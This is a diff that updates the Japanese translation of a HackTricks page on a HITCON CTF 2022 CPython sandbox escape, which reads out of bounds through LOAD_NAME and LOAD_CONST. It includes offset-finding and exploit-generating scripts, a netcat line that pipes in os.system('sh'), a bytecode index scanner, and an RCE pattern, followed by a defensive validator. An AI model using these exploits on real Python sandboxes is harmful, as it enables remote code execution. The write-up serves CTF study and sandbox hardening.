@@ -2,32 +2,32 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**この情報は** [**この書き込みから**](https://blog.splitline.tw/hitcon-ctf-2022/)**取得されました。**
+**この情報は** [**こちらの writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**から取得しました。**<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-LOAD_NAME / LOAD_CONST opcodeのOOBリード機能を使用して、メモリ内のいくつかのシンボルを取得できます。これは、`(a, b, c, ... 数百のシンボル ..., __getattribute__) if [] else [].__getattribute__(...)`のようなトリックを使用して、取得したいシンボル（関数名など）を得ることを意味します。
+LOAD_NAME / LOAD_CONST opcode の OOB read 機能を使用して、メモリ内の任意の symbol を取得できます。つまり、`(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` のような trick を使って、必要な symbol（function name など）を取得できます。
 
-その後、エクスプロイトを作成します。
+あとは exploit を作成するだけです。
 
 ### 概要 <a href="#overview-1" id="overview-1"></a>
 
-ソースコードは非常に短く、わずか4行しか含まれていません！
+source code は非常に短く、わずか 4 行しかありません！
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-任意のPythonコードを入力できますが、それは[Pythonコードオブジェクト](https://docs.python.org/3/c-api/code.html)にコンパイルされます。しかし、そのコードオブジェクトの`co_consts`と`co_names`は、evalがそのコードオブジェクトを実行する前に空のタプルに置き換えられます。
+任意の Python code を入力でき、それは [Python code object](https://docs.python.org/3/c-api/code.html) にコンパイルされます。ただし、その code object の `co_consts` と `co_names` は、その code object を eval する前に空の tuple に置き換えられます。
 
-このようにして、すべての式に含まれる定数（例：数値、文字列など）や名前（例：変数、関数）が最終的にセグメンテーションフォルトを引き起こす可能性があります。
+そのため、consts（数値や文字列など）または names（変数や関数など）を含むすべての expression は、最終的に segmentation fault を引き起こす可能性があります。
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
-セグフォルトはどのように発生するのでしょうか？
+segfault はどのように発生するのでしょうか？
 
-簡単な例から始めましょう。`[a, b, c]`は次のバイトコードにコンパイルされる可能性があります。
+まず、簡単な例として、`[a, b, c]` は次の bytecode にコンパイルされます。
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
@@ -35,11 +35,11 @@ print(eval(code, {'__builtins__': {}}))1234
 6 BUILD_LIST               3
 8 RETURN_VALUE12345
 ```
-しかし、`co_names` が空のタプルになった場合はどうなるでしょうか？ `LOAD_NAME 2` オペコードはまだ実行され、そのメモリアドレスから値を読み取ろうとします。はい、これは境界外読み取りの「機能」です。
+しかし、`co_names` が空の tuple になった場合はどうなるのでしょうか？`LOAD_NAME 2` opcode は依然として実行され、元々読み取るはずだったメモリアドレスから値を読み取ろうとします。そう、これは out-of-bound read の「feature」です。
 
-解決策の核心概念はシンプルです。CPythonのいくつかのオペコード、例えば `LOAD_NAME` と `LOAD_CONST` は境界外読み取りに対して脆弱です（？）。
+解決策の基本的な考え方はシンプルです。CPython の一部の opcode、例えば `LOAD_NAME` や `LOAD_CONST` は、OOB read に脆弱です（？）。
 
-これらは、`consts` または `names` タプルから `oparg` インデックスのオブジェクトを取得します（これが内部で `co_consts` と `co_names` と呼ばれるものです）。以下の短いスニペットを参照して、CPythonが `LOAD_CONST` オペコードを処理する際に何を行うかを見てみましょう。
+これらは、`consts` または `names` tuple（内部ではそれぞれ `co_consts` と `co_names` と呼ばれています）から、インデックス `oparg` のオブジェクトを取得します。次の短い `LOAD_CONST` の snippet を見ると、CPython が `LOAD_CONST` opcode を処理する際に何を行うのかを確認できます。
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -49,21 +49,21 @@ PUSH(value);
 FAST_DISPATCH();
 }1234567
 ```
-この方法で、任意のメモリオフセットから「名前」を取得するためにOOB機能を使用できます。その名前が何で、オフセットが何であるかを確認するには、`LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... を試し続けてください。そして、オパラグが700を超える何かを見つけることができるかもしれません。もちろん、gdbを使用してメモリレイアウトを確認することもできますが、それがもっと簡単になるとは思いません。
+この方法で、OOB feature を使って任意のメモリオフセットから `"name"` を取得できます。どのような name で、どのオフセットにあるかを確認するには、`LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... と試し続けるだけです。oparg > 700 付近で何か見つかるかもしれません。もちろん、gdb を使ってメモリレイアウトを確認することもできますが、そのほうが簡単になるとは思いません。
 
-### Exploitの生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
+### Exploit の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-有用な名前/定数のオフセットを取得したら、どのようにそのオフセットから名前/定数を取得して使用するのでしょうか？ここにあなたへのトリックがあります：\
-オフセット5（`LOAD_NAME 5`）から`__getattribute__`の名前を取得できると仮定し、`co_names=()`の場合、次のことを行ってください：
+names / consts の有用なオフセットを取得できたとして、そのオフセットから name / const を取得して利用するにはどうすればよいでしょうか。ここで、次の trick を紹介します:\
+`co_names=()` の状態で、オフセット 5 (`LOAD_NAME 5`) から `__getattribute__` name を取得できると仮定すると、次のようにします:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> `__getattribute__` と名付ける必要はなく、もっと短い名前や奇妙な名前を付けることができます。
+> `__getattribute__` として名前を付ける必要はなく、もっと短い名前や、さらに奇妙な名前を付けることもできます。
 
-その理由は、バイトコードを見るだけで理解できます:
+その理由は、bytecode を見るだけで理解できます。
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -80,9 +80,9 @@ FAST_DISPATCH();
 24 BUILD_LIST               1
 26 RETURN_VALUE1234567891011121314
 ```
-`LOAD_ATTR`が`co_names`から名前を取得することに注意してください。Pythonは名前が同じであれば同じオフセットから名前をロードしますので、2番目の`__getattribute__`もoffset=5からロードされます。この機能を使用することで、名前が近くのメモリにある場合に任意の名前を使用できます。
+`LOAD_ATTR` も `co_names` から name を取得することに注意してください。Python は name が同じ場合、同じ offset から name をロードするため、2 つ目の `__getattribute__` も引き続き offset=5 からロードされます。この機能を使うと、name が近くのメモリ内に存在している場合、任意の name を使用できます。
 
-数を生成するのは簡単なはずです：
+数値の生成は簡単です。
 
 - 0: not \[\[]]
 - 1: not \[]
@@ -91,9 +91,9 @@ FAST_DISPATCH();
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-長さ制限のため、constsは使用しませんでした。
+長さ制限のため、consts は使用していません。
 
-まず、名前のオフセットを見つけるためのスクリプトを示します。
+まず、name の offset を見つけるための script を示します。
 ```python
 from types import CodeType
 from opcode import opmap
@@ -128,7 +128,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-次は、実際のPythonエクスプロイトを生成するためのものです。
+以下は実際の Python exploit を生成するためのものです。
 ```python
 import sys
 import unicodedata
@@ -205,7 +205,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-それは基本的に次のことを行います。私たちはその文字列を`__dir__`メソッドから取得します：
+基本的に、`__dir__` メソッドから取得した文字列に対して、以下の処理を行います：
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -220,18 +220,18 @@ builtins['eval'](builtins['input']())
 ```
 ---
 
-### バージョンノートと影響を受けるオペコード (Python 3.11–3.13)
+### バージョンに関する注記と影響を受ける opcode（Python 3.11–3.13）
 
-- CPython バイトコードオペコードは、整数オペランドによって `co_consts` と `co_names` タプルにインデックスを付けます。攻撃者がこれらのタプルを空にする（またはバイトコードで使用される最大インデックスよりも小さくする）ことができれば、インタープリタはそのインデックスのために範囲外のメモリを読み取り、近くのメモリから任意の PyObject ポインタを得ることになります。関連するオペコードには少なくとも以下が含まれます：
+- CPython の bytecode opcode は、整数オペランドによって `co_consts` および `co_names` タプルを引き続きインデックス参照します。攻撃者がこれらのタプルを空（または bytecode で使用される最大インデックスより小さい状態）にできる場合、interpreter はそのインデックスの範囲外メモリを読み取り、近傍メモリから任意の PyObject pointer を取得します。関連する opcode には少なくとも以下が含まれます。
 - `LOAD_CONST consti` → `co_consts[consti]` を読み取ります。
-- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → `co_names[...]` から名前を読み取ります（3.11+ では `LOAD_ATTR`/`LOAD_GLOBAL` が低ビットにフラグビットを格納することに注意してください; 実際のインデックスは `namei >> 1` です）。バージョンごとの正確な意味については、ディスアセンブラのドキュメントを参照してください。[Python dis docs].
-- Python 3.11+ では、命令の間に隠れた `CACHE` エントリを追加する適応/インラインキャッシュが導入されました。これは OOB プリミティブを変更するものではなく、バイトコードを手作りする場合は、`co_code` を構築する際にこれらのキャッシュエントリを考慮する必要があることを意味します。
+- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → `co_names[...]` から name を読み取ります（3.11+ では `LOAD_ATTR`/`LOAD_GLOBAL` が low bit に flag bits を格納する点に注意してください。実際のインデックスは `namei >> 1` です）。バージョンごとの正確なセマンティクスについては disassembler docs を参照してください。[Python dis docs].<sup>[[2]](#references)</sup>
+- Python 3.11+ では、命令間に hidden `CACHE` entries を追加する adaptive/inline caches が導入されました。これは OOB primitive 自体を変更しません。ただし、bytecode を手動で作成する場合は、`co_code` の構築時にこれらの cache entries を考慮する必要があります。
 
-実用的な影響：このページの技術は、コードオブジェクトを制御できる場合（例：`CodeType.replace(...)` を介して）に、`co_consts`/`co_names` を縮小することで CPython 3.11、3.12、3.13 で引き続き機能します。
+実用上の意味：code object（例：`CodeType.replace(...)` 経由）を制御でき、`co_consts`/`co_names` を小さくできる場合、このページの technique は CPython 3.11、3.12、3.13 でも引き続き機能します。
 
-### 有用な OOB インデックスのためのクイックスキャナー (3.11+/3.12+ 互換)
+### 有用な OOB インデックス用の簡易 scanner（3.11+/3.12+ compatible）
 
-高レベルのソースからではなく、バイトコードから直接興味深いオブジェクトを探ることを好む場合は、最小限のコードオブジェクトを生成し、インデックスをブルートフォースすることができます。以下のヘルパーは、必要に応じてインラインキャッシュを自動的に挿入します。
+high-level source ではなく bytecode から直接 interesting objects を probe したい場合は、最小限の code objects を生成し、インデックスを brute force できます。以下の helper は、必要に応じて inline caches を自動的に挿入します。
 ```python
 import dis, types
 
@@ -270,13 +270,13 @@ obj = probe_const(idx)
 if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
-ノート
-- 名前を調べる代わりに、`LOAD_CONST`を`LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`に置き換え、スタックの使用を適切に調整してください。
-- 必要に応じて、`EXTENDED_ARG`または複数のバイトの`arg`を使用して、インデックス>255に到達します。上記のように`dis`でビルドする際は、低バイトのみを制御します。より大きなインデックスの場合は、生のバイトを自分で構築するか、攻撃を複数のロードに分割してください。
+メモ
+- 代わりに names を probe するには、`LOAD_CONST` を `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` に置き換え、stack の使用方法を適宜調整します。
+- 必要に応じて、`EXTENDED_ARG` または `arg` の複数バイトを使用して、255 より大きい index に到達します。上記のように `dis` で構築する場合、制御できるのは low byte のみです。より大きな index については、raw bytes を自分で構築するか、複数の load に分けて attack を行います。
 
-### 最小限のバイトコードのみのRCEパターン (co_consts OOB → builtins → eval/input)
+### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
 
-`co_consts`インデックスがbuiltinsモジュールに解決されることを特定したら、スタックを操作することで`eval(input())`を`co_names`なしで再構築できます:
+`co_consts` index が builtins module に解決されることを特定できたら、stack を操作することで `co_names` を使わずに `eval(input())` を再構築できます:
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,13 +285,13 @@ print(idx, type(obj), repr(obj)[:80])
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-このアプローチは、`co_code` に直接制御を与え、`co_consts=()` および `co_names=()` を強制するチャレンジ（例：BCTF 2024 “awpcode”）で有用です。ソースレベルのトリックを回避し、バイトコードスタック操作とタプルビルダーを活用することでペイロードサイズを小さく保ちます。
+このアプローチは、`co_code` を直接制御できる一方で `co_consts=()` と `co_names=()` を強制される challenge（例：BCTF 2024 “awpcode”）で有用です。source-level の tricks を避け、bytecode の stack ops と tuple builders を活用することで、payload size を小さく保てます。
 
-### サンドボックスのための防御的チェックと緩和策
+### sandboxes に対する防御チェックと mitigation
 
-信頼できないコードをコンパイル/評価するか、コードオブジェクトを操作する Python “sandbox” を作成している場合、バイトコードによって使用されるタプルインデックスの境界チェックに CPython に依存しないでください。代わりに、実行する前にコードオブジェクトを自分で検証してください。
+信頼できない code を compile/evaluate したり、code objects を操作したりする Python “sandbox” を作成する場合、bytecode で使用される tuple indexes の bounds-checking を CPython に依存しないでください。代わりに、実行前に code objects 自体を検証してください。
 
-実用的なバリデーター（co_consts/co_names への OOB アクセスを拒否）
+実用的な validator（`co_consts`/`co_names` への OOB access を拒否）
 ```python
 import dis
 
@@ -324,13 +324,12 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # eval(c, {'__builtins__': {}})
 ```
 追加の緩和策
-- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しないか、結果のコードオブジェクトに対して厳格な構造チェックを追加してください。
-- CPythonのセマンティクスに依存するのではなく、OSレベルのサンドボックス（seccomp、ジョブオブジェクト、コンテナ）で信頼できないコードを別のプロセスで実行することを検討してください。
+- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しない、または生成された code object に対して厳格な構造チェックを追加する。
+- CPython のセマンティクスに依存する代わりに、OS レベルの sandbox（seccomp、job objects、containers）を使用して、信頼できない code を別プロセスで実行することを検討する。
 
+## References
 
+- [1] [この technique の起源と exploit chain の概要に関する Splitline の HITCON CTF 2022 writeup「V O I D」](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Python disassembler docs（LOAD_CONST/LOAD_NAME などの indices semantics、および 3.11+ における `LOAD_ATTR`/`LOAD_GLOBAL` の low-bit flags）](https://docs.python.org/3.13/library/dis.html)
 
-## 参考文献
-
-- SplitlineのHITCON CTF 2022のレポート「V O I D」（この技術の起源と高レベルのエクスプロイトチェーン）： https://blog.splitline.tw/hitcon-ctf-2022/
-- Python逆アセンブラのドキュメント（LOAD_CONST/LOAD_NAME/etc.のインデックスセマンティクス、および3.11+の `LOAD_ATTR`/`LOAD_GLOBAL` の低ビットフラグ）： https://docs.python.org/3.13/library/dis.html
 {{#include ../../../banners/hacktricks-training.md}}
